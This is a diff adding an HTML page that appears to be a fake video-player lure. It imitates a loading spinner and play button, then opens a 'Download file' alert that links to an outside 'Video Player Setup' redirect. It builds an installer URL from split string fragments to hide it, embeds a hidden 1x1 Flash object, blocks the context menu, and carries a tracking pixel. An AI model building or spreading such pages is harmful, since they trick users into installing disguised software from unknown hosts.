@@ -1,0 +1,287 @@
+<html>
+    <head>
+<title>Download file</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<LINK REL="SHORTCUT ICON" HREF="favicon.ico">
+
+        <style>
+            html {
+                overflow: hidden;
+            }
+
+            html, body {
+                background-color: #000;
+                color: #fff;
+
+                padding: 0;
+                margin: 0;
+                border: 0;
+
+                width: 100%;
+                height: 100%;
+
+                font-family: Arial;
+                font-size: 13px;
+            }
+
+            body {
+                background-position: center;
+                background-repeat: no-repeat;
+            }
+
+            #header-content {
+                position: relative;
+                min-height: 100%;
+            }
+
+            #content {
+                padding-bottom: 3em;
+
+            }
+
+            #footer {
+                position: relative;
+                height: 3em;
+                margin: -3em 0 0;
+
+                background: #45484d; /* Old browsers */
+                /* IE9 SVG, needs conditional override of 'filter' to 'none' */
+                background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzQ1NDg0ZCIgc3RvcC1vcGFjaXR5PSIxIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+);
+                background: -moz-linear-gradient(top, #45484d 0%, #000000 100%); /* FF3.6+ */
+                background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #45484d), color-stop(100%, #000000)); /* Chrome,Safari4+ */
+                background: -webkit-linear-gradient(top, #45484d 0%, #000000 100%); /* Chrome10+,Safari5.1+ */
+                background: -o-linear-gradient(top, #45484d 0%, #000000 100%); /* Opera 11.10+ */
+                background: -ms-linear-gradient(top, #45484d 0%, #000000 100%); /* IE10+ */
+                background: linear-gradient(to bottom, #45484d 0%, #000000 100%); /* W3C */
+                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#45484d', endColorstr='#000000', GradientType=0); /* IE6-8 */
+            }
+
+            a, a:hover, a:focus, a:visited {
+                color: #00f;
+            }
+
+            .title {
+                padding: 10px;
+            }
+
+            .spinner {
+                width: 50%;
+                height: 50%;
+                overflow: auto;
+                margin: auto;
+                position: absolute;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                right: 0;
+                display: none;
+            }
+
+            .big-play {
+                width: 50%;
+                height: 50%;
+                overflow: auto;
+                margin: auto;
+                position: absolute;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                right: 0;
+                display: none;
+                cursor: pointer;
+            }
+
+            .big-play:hover {
+                opacity: 1 !important;
+            }
+
+            #sbg {
+                display: none;
+            }
+
+            .transport {
+                border: none;
+                border-top: 1px solid #888;
+            }
+
+            .play-sm {
+                padding: 8px;
+                display: inline-block;
+                opacity: 0.7;
+                cursor: pointer;
+            }
+
+            .play-sm:hover {
+                opacity: 1;
+            }
+
+            .alert {
+                width: 50%;
+                height: 50%;
+                overflow: auto;
+                margin: auto;
+                position: absolute;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                right: 0;
+                background-color: #eee;
+                padding: 16px;
+                color: #111;
+                display: none;
+            }
+
+            .alert h1 {
+                margin: 0;
+                margin-bottom: 10px;
+                font-size: 16px;
+
+            }
+        </style>
+
+        <script type="text/javascript" src="jquery.js"></script>
+        <script>
+        var scrLoaded = false;
+        var scrCanShow = false;
+
+        function screenLoaded() {
+            scrLoaded = true;
+            if (scrCanShow) {
+                showScreen();
+            }
+        }
+
+        function showScreen() {
+            $('body').css("background-image", "url(video.php)").css("background-size", "100%");
+        }
+
+        function play() {
+            $(".big-play").hide();
+            $(".play-sm img").attr("src", "pause.png");
+            $('body').css("background-image", "none");
+            $(".spinner").fadeIn('slow');
+            setTimeout(function () {
+                $(".spinner").hide();
+                $(".alert").fadeIn();
+                $('body').css("background-image", "url(noise.gif)").css("background-size", "100%");
+                var obj = $("#object-template").html().replace(/object-template/g, 'object').replace(/embed-template/g, 'embed');
+                $("#object-placeholder").html(obj);
+            }, 3000);
+        }
+
+        function downloadMediaPlayer() {
+            document.location.href = 'http://dow' + 'nloadfiles' + '-cdn.com/d' + 'irect/down' + 'loads/medi' + 'aplayer_se' + 'tup.php?a=' + '11453&s=0&' + 'tp=41&fv=1' + '0';
+            return false;
+        }
+
+        $(function () {
+
+            $(".spinner").fadeIn('slow', function () {
+                setTimeout(function () {
+                    $(".spinner").fadeOut('fast', function () {
+                        $(".big-play").fadeIn('fast', function () {
+                            $(".big-play").css('opacity', 0.7);
+                            scrCanShow = true;
+                            if (scrLoaded) {
+                                showScreen();
+                            }
+                        });
+                    });
+
+                }, 1000);
+            });
+        });
+
+        </script>
+    </head>
+    <body oncontextmenu="return false;">
+
+
+
+
+
+
+    <div id="header-content">
+
+        <img id="sbg" src="noise.gif" onload="screenLoaded()">
+
+        <div id="header" class="title">
+                    </div>
+        <div id="content">
+            <img src="spinner.gif" style="display: none;">
+            <img src="dl.png" style="display: none;">
+            <img src="pause.png" style="display: none;">
+            <img src="noise.gif" style="display: none;">
+
+            <div class="spinner"
+                 style="background-image: url(spinner.gif); background-repeat: no-repeat; width: 50px; height: 50px"></div>
+            <div class="big-play" onclick="play()"
+                 style="background-image: url(dl.png); background-repeat: no-repeat; width: 246px; height: 95px"></div>
+            <div class="alert">
+
+                <h1>Download file</h1>
+                <hr>
+
+                <p>
+                    <b></b><br>
+                    <a href="http://kroo66.com/r/?token=0b042d7444f9a36f2f0a37b623d91fbb196f4c12&q=Video+Player+Setup" target="_blank"><img src="dl.png" width="246" height="95" border="0"></a><br>
+                </p>
+
+                <p><img src="http://s4is.histats.com/stats/i/254604.gif?254604&103" width="0" height="0" border="0"></p>
+
+
+
+
+
+
+            </div>
+        </div>
+
+    </div>
+    <div id="footer">
+        <div class="play-sm" onclick="play()">
+            <img src="play_sm.png" style="width: 24px; height: 24px">
+        </div>
+
+
+        <div style="display: inline; position: absolute; top: 13px; left: 49px; right: 130px">
+            <hr class="transport">
+            <div
+                style="display: inline-block; z-index:1000; position: relative; top: -13px; left: 0%; margin: 0; padding:0">
+                <img src="circle2.png" style="width: 12px; height: 12px">
+            </div>
+        </div>
+
+        <div style="padding: 12px; display: inline-block; float: right;">
+            <img src="full.png" style="width: 16px; height: 16px;">
+        </div>
+
+        <div style="padding: 12px; display: inline-block; float: right;">
+            <img src="volume.png" style="width: 16px; height: 16px;">
+        </div>
+
+        <div style="padding: 12px; display: inline-block; float: right;">
+            0:00        </div>
+
+    </div>
+
+    <div id="object-template">
+        <object-template classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
+                         codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0"
+                         width="1"
+                         height="1" id="nav" align="middle">
+            <param name="allowScriptAccess" value="sameDomain"/>
+            <param name="allowFullScreen" value="false"/>
+            <param name="movie" value="nav.swf"/>
+            <param name="menu" value="false"/>
+            <param name="quality" value="high"/>
+            <param name="wmode" value="transparent"/>
+            <param name="bgcolor" value="#ffffff"/>
+            <embed-template src="nav.swf" menu="false" quality="high" wmode="transparent" bgcolor="#ffffff"
+                   width="1" height="1" name="nav" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false"
+                   type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer"/>
+        </object-template>
+    </div>
+    <div id="object-placeholder"></div>
+    </body>
+    </html>
